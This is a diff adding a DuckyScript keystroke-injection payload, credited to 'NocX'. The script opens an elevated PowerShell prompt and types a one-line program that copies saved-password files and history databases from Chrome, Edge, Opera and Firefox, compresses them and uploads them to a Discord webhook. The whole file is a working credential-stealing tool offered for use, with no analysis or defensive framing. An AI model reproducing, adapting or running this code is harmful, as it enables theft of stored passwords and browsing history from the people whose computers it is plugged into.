@@ -1,0 +1,26 @@
+REM Author: NocX
+REM Description: Attempts to collect login data and browser history (Chrome, Edge, Firefox, Opera) and sends them to a Discord webhook.
+REM Version: 2.7
+REM Date: 17/01/2025
+REM Category: Data
+REM ------------------------------------
+REM This script:
+REM 1 Opens PowerShell (Admin)
+REM 2 Collects browser data
+REM 3 Send to discord via a webhook
+REM 4 Closes everything
+REM ------------------------------------
+
+REM ---------- Open PowerShell as Admin ----------
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 500
+REM ---------- Collects browser data and send to discord via a webhook  ----------3
+STRING function Send-DataToDiscord { param ( [string]$filePath, [string]$message ) $webhookUrl = "YOUR_DISCORD_WEBHOOK_TOKEN"; $Body = @{ content = "$env:computername $message" }; Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F "file1=@$filePath" $webhookUrl } function Copy-And-Compress-File { param ( [string]$filePath, [string]$message ) $tempDir = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName()); New-Item -ItemType Directory -Path $tempDir | Out-Null; $tempFilePath = [System.IO.Path]::Combine($tempDir, [System.IO.Path]::GetFileName($filePath)); Copy-Item -Path $filePath -Destination $tempFilePath -Force; $zipFilePath = [System.IO.Path]::Combine($tempDir, [System.IO.Path]::GetFileNameWithoutExtension($filePath) + ".zip"); Add-Type -AssemblyName "System.IO.Compression.FileSystem"; [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipFilePath, [System.IO.Compression.CompressionLevel]::Optimal, $false); Send-DataToDiscord -filePath $zipFilePath -message $message; Remove-Item -Path $tempDir -Recurse } function Send-MultipleFiles { param ( [array]$files, [string]$message ) foreach ($filePath in $files) { if (Test-Path $filePath) { Copy-And-Compress-File -filePath $filePath -message $message } } } $chromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; if (Test-Path $chromeProfilePath) { $historyDb = "$chromeProfilePath\History"; $loginDataFiles = @("$chromeProfilePath\Login Data", "$chromeProfilePath\Login Data For Account", "$chromeProfilePath\Login Data For Account-journal", "$chromeProfilePath\Login Data-journal"); Send-MultipleFiles -files $loginDataFiles -message "Chrome Passwords"; if (Test-Path $historyDb) { Copy-And-Compress-File -filePath $historyDb -message "Chrome History" } } $edgeProfilePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; if (Test-Path $edgeProfilePath) { $historyDb = "$edgeProfilePath\History"; $loginDataFiles = @("$edgeProfilePath\Login Data", "$edgeProfilePath\Login Data For Account", "$edgeProfilePath\Login Data For Account-journal", "$edgeProfilePath\Login Data-journal"); Send-MultipleFiles -files $loginDataFiles -message "Edge Passwords"; if (Test-Path $historyDb) { Copy-And-Compress-File -filePath $historyDb -message "Edge History" } } $operaProfilePath = "$env:APPDATA\Opera Software\Opera Stable"; if (Test-Path $operaProfilePath) { $historyDb = "$operaProfilePath\History"; $loginDataFiles = @("$operaProfilePath\Login Data", "$operaProfilePath\Login Data For Account", "$operaProfilePath\Login Data For Account-journal", "$operaProfilePath\Login Data-journal"); Send-MultipleFiles -files $loginDataFiles -message "Opera Passwords"; if (Test-Path $historyDb) { Copy-And-Compress-File -filePath $historyDb -message "Opera History" } } $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"; if (Test-Path $firefoxProfilePath) { $firefoxProfiles = Get-ChildItem $firefoxProfilePath -Directory; foreach ($profile in $firefoxProfiles) { $placesSqlite = "$($profile.FullName)\places.sqlite"; if (Test-Path $placesSqlite) { Copy-And-Compress-File -filePath $placesSqlite -message "Firefox History from profile $($profile.Name)" } $loginsJson = "$($profile.FullName)\logins.json"; if (Test-Path $loginsJson) { Copy-And-Compress-File -filePath $loginsJson -message "Firefox Passwords from profile $($profile.Name)" } } } exit
+ENTER
